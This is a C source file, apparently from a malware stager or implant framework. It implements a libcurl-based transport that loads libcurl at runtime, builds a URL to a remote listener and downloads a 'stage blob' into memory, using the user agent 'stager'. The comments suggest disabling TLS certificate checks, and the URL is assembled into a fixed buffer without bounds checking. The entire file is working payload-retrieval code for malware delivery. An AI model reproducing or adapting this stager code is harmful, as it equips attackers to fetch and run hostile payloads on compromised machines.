/*
 * transport_libcurl.c — libcurl transport.
 *
 * Downloads the stage blob using libcurl, which is loaded at runtime via
 * dynload.h (see that header for how dl* is resolved from libc). No curl
 * headers are required to build; the small stable ABI subset used here is
 * declared below.
 *
 * SONAMES lists the libcurl sonames to try, newest first — adjust for your
 * target environment. For HTTPS (e.g. the TLS-enabled standalone listener),
 * switch the URL scheme to https:// and set CURLOPT_SSL_VERIFYPEER to 0L for
 * self-signed certificates.
 */

#include "dynload.h"
#include "transport.h"
#include "utils.h"

/* Fixed-width rows (not a pointer array) keep this position-independent. */
static const char SONAMES[][16] = {"libcurl.so.5", "libcurl.so.4"};

/* ---- minimal libcurl ABI (stable; see <curl/curl.h>) ---- */
typedef void CURL;
typedef long CURLcode;
typedef long CURLoption;

#define CURLOPT_URL 10002
#define CURLOPT_WRITEFUNCTION 20011
#define CURLOPT_WRITEDATA 10001
#define CURLOPT_FOLLOWLOCATION 52
#define CURLOPT_USERAGENT 10018
#define CURLOPT_SSL_VERIFYPEER 64
#define CURLOPT_CONNECTTIMEOUT 78
#define CURLOPT_TIMEOUT 13
#define CURLOPT_NOSIGNAL 99

#define CURL_GLOBAL_ALL 3
#define CURLE_OK 0

typedef size_t (*curl_write_cb)(char *, size_t, size_t, void *);
typedef CURL *(*curl_easy_init_fn)(void);
typedef CURLcode (*curl_easy_setopt_fn)(CURL *, CURLoption, ...);
typedef CURLcode (*curl_easy_perform_fn)(CURL *);
typedef void (*curl_easy_cleanup_fn)(CURL *);
typedef CURLcode (*curl_global_init_fn)(long);

typedef struct {
  char *buf;
  size_t len;
  size_t cap;
} write_ctx;

static size_t write_cb(char *ptr, size_t size, size_t nmemb, void *userdata) {
  size_t total = size * nmemb;
  write_ctx *ctx = (write_ctx *)userdata;
  if (ctx->len + total > ctx->cap)
    return 0; /* overflow: abort the transfer */
  memcpy(ctx->buf + ctx->len, ptr, total);
  ctx->len += total;
  return total;
}

static size_t libcurl_download(const char *host, const char *port,
                               const char *path, void *buffer, size_t capacity,
                               const uint8_t *key) {
  (void)key;

  void *curl_lib = NULL;
  size_t nsons = sizeof(SONAMES) / sizeof(SONAMES[0]);
  for (size_t i = 0; i < nsons; i++) {
    curl_lib = dynload_open(SONAMES[i], RTLD_NOW | RTLD_LOCAL);
    if (curl_lib) {
      debug_print("libcurl: loaded %s\n", SONAMES[i]);
      break;
    }
  }
  if (!curl_lib)
    return 0;

  curl_easy_init_fn easy_init =
      (curl_easy_init_fn)dynload_sym(curl_lib, "curl_easy_init");
  curl_easy_setopt_fn easy_setopt =
      (curl_easy_setopt_fn)dynload_sym(curl_lib, "curl_easy_setopt");
  curl_easy_perform_fn easy_perform =
      (curl_easy_perform_fn)dynload_sym(curl_lib, "curl_easy_perform");
  curl_easy_cleanup_fn easy_cleanup =
      (curl_easy_cleanup_fn)dynload_sym(curl_lib, "curl_easy_cleanup");
  curl_global_init_fn global_init =
      (curl_global_init_fn)dynload_sym(curl_lib, "curl_global_init");
  if (!easy_init || !easy_setopt || !easy_perform || !easy_cleanup ||
      !global_init) {
    dynload_close(curl_lib);
    return 0;
  }
  global_init(CURL_GLOBAL_ALL);

  CURL *easy = easy_init();
  if (!easy)
    return 0;

  /* Build URL: http://host:port/path (use https:// for a TLS listener). */
  char url[1024];
  char *p = url;
  size_t n;
  memcpy(p, "http://", 7);
  p += 7;
  n = strlen(host);
  memcpy(p, host, n);
  p += n;
  *p++ = ':';
  n = strlen(port);
  memcpy(p, port, n);
  p += n;
  n = strlen(path);
  memcpy(p, path, n);
  p += n;
  *p = '\0';

  write_ctx ctx = {(char *)buffer, 0, capacity};

  easy_setopt(easy, CURLOPT_URL, url);
  easy_setopt(easy, CURLOPT_WRITEFUNCTION, write_cb);
  easy_setopt(easy, CURLOPT_WRITEDATA, &ctx);
  easy_setopt(easy, CURLOPT_FOLLOWLOCATION, 1L);
  easy_setopt(easy, CURLOPT_USERAGENT, "stager");
  easy_setopt(easy, CURLOPT_NOSIGNAL, 1L);
  easy_setopt(easy, CURLOPT_CONNECTTIMEOUT, 10L);
  easy_setopt(easy, CURLOPT_TIMEOUT, 30L);

  CURLcode res = easy_perform(easy);
  easy_cleanup(easy);

  return res == CURLE_OK ? ctx.len : 0;
}

const char *transport_name(void) { return "libcurl"; }

size_t transport_download(const char *host, const char *port, const char *path,
                          void *buffer, size_t capacity, const uint8_t *key) {
  return libcurl_download(host, port, path, buffer, capacity, key);
}
